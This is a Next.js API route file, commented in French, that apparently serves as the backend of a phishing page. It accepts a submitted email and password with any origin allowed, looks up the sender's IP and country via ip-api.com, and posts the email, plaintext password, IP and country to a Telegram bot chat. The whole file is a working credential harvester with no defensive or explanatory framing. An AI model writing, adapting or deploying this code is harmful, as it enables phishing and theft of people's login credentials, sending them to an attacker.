// pages/api/webhook.js
export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  if (req.method !== "POST") {
    return res.status(405).json({ error: "Méthode non autorisée" });
  }

  try {
    const { email, motDePasse } = req.body || {};

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.CHAT_ID;

    if (!botToken || !chatId) {
      console.error("Variables d'environnement manquantes");
      return res.status(500).json({ error: "Configuration serveur incomplète" });
    }

    // --- 1. Obtenir l'IP du client
    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0] ||
      req.socket?.remoteAddress ||
      "IP inconnue";

    // --- 2. Appeler une API pour obtenir le pays
    let country = "Inconnu";
    try {
      const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
      const geoData = await geoRes.json();
      if (geoData && geoData.country) {
        country = geoData.country;
      }
    } catch (e) {
      console.warn("Impossible d'obtenir le pays via IP");
    }

    // --- 3. Créer le message formaté
    const message = `Nouvelle soumission :
🌍 IP : ${ip} (${country})
📧 Email : ${email}
🔑 Mot de passe : ${motDePasse}`;

    // --- 4. Envoyer le message à Telegram
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const telegramResponse = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: message }),
    });

    if (!telegramResponse.ok) {
      const text = await telegramResponse.text();
      console.error("Telegram returned error:", text);
      return res.status(500).json({ error: "Erreur lors de l'envoi à Telegram", details: text });
    }

    return res.status(200).json({ success: true, message: "Données envoyées à Telegram" });
  } catch (error) {
    console.error("Erreur serveur:", error);
    return res.status(500).json({ error: "Erreur serveur" });
  }
}
